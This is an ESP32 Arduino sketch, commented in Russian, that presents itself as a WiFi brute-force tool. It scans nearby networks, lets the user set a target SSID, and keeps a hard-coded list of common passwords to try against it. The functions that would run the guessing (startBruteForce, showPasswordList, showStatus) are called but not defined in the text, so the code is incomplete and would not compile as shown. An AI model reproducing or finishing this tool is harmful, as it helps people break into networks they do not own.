#include <WiFi.h>

// Конфигурация
const int TIMEOUT = 8000; // Таймаут подключения в мс
String targetSSID = "";   // Целевая WiFi сеть (будет введена)

// Список популярных паролей
const char* commonPasswords[] = {
  "12345678", "password", "123456789", "12345", "1234567",
  "qwerty123", "admin123", "11111111", "87654321", "00000000",
  "qwertyui", "1q2w3e4r", "1234567890", "qwerty", "abc123",
  "password123", "123123", "111111", "222222", "333333",
  "qwerty1", "qazwsx", "qwertyuiop", "q1w2e3r4", "asdfgh",
  "zxcvbnm", "football", "monkey", "letmein", "dragon",
  "baseball", "master", "superman", "batman", "starwars",
  "654321", "987654321", "123321", "555555", "7777777",
  "qazwsxedc", "qwerty1234", "qwe123", "asd123", "zxc123"
};

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n=================================");
  Serial.println("  WIFI BRUTE FORCE TOOL");
  Serial.println("=================================");
  Serial.println("Команды:");
  Serial.println("  scan         - сканировать сети");
  Serial.println("  set [SSID]   - установить цель");
  Serial.println("  start        - начать перебор");
  Serial.println("  list         - показать пароли");
  Serial.println("  help         - это сообщение");
  Serial.println("=================================\n");
  
  WiFi.mode(WIFI_STA);
  WiFi.setAutoReconnect(false);
  WiFi.persistent(false);
}

void loop() {
  if(Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    processCommand(command);
  }
}

void processCommand(String cmd) {
  if(cmd == "help") {
    printHelp();
  }
  else if(cmd == "scan") {
    scanNetworks();
  }
  else if(cmd.startsWith("set ")) {
    targetSSID = cmd.substring(4);
    targetSSID.trim();
    Serial.printf("Цель установлена: %s\n", targetSSID.c_str());
  }
  else if(cmd == "start") {
    if(targetSSID.length() > 0) {
      startBruteForce();
    } else {
      Serial.println("❌ Сначала установите цель (set SSID)");
    }
  }
  else if(cmd == "list") {
    showPasswordList();
  }
  else if(cmd == "status") {
    showStatus();
  }
  else if(cmd == "clear") {
    targetSSID = "";
    Serial.println("Цель очищена");
  }
  else if(cmd.length() > 0) {
    Serial.println("Неизвестная команда. Введите 'help'");
  }
}

void printHelp() {
  Serial.println("\n=== ДОСТУПНЫЕ КОМАНДЫ ===");
  Serial.println("scan            - сканировать WiFi сети");
  Serial.println("set ДОМАШНИЙ    - установить цель (пример: set ДОМАШНИЙ_WiFi)");
  Serial.println("start           - начать перебор паролей");
  Serial.println("list            - показать список паролей");
  Serial.println("status          - показать текущую цель");
  Serial.println("clear           - очистить цель");
  Serial.println("help            - показать помощь");
  Serial.println("==========================\n");
}

void scanNetworks() {
  Serial.println("\n🔍 Сканирование WiFi сетей...");
  
  int n = WiFi.scanNetworks();
  
  if(n == 0) {
    Serial.println("❌ Сети не найдены");
  } else {
    Serial.printf("✅ Найдено %d сетей:\n", n);
    Serial.println("----------------------------");
    for(int i = 0; i < n; i++) {
      Serial.printf("%d. %s ", i+1, WiFi.SSID(i).c_str());
      Serial.printf("(%d dBm) ", WiFi.RSSI(i));
      
      // Показываем тип шифрования
      switch(WiFi.encryptionType(i)) {
        case WIFI_AUTH_OPEN:
          Serial.print("[ОТКРЫТАЯ]");
          break;
        case WIFI_AUTH_WEP:
          Serial.print("[WEP]");
          break;
        case WIFI_AUTH_WPA_PSK:
          Serial.print("[WPA]");
          break;
        case WIFI_AUTH_WPA2_PSK:
          Serial.print("[WPA2]");
          break;
        default:
          Serial.print("[ЗАЩИЩЕНА]");
      }
      Serial.println();
    }
    Serial.println("----------------------------");
  }
  
  WiFi.scanDelete();
}
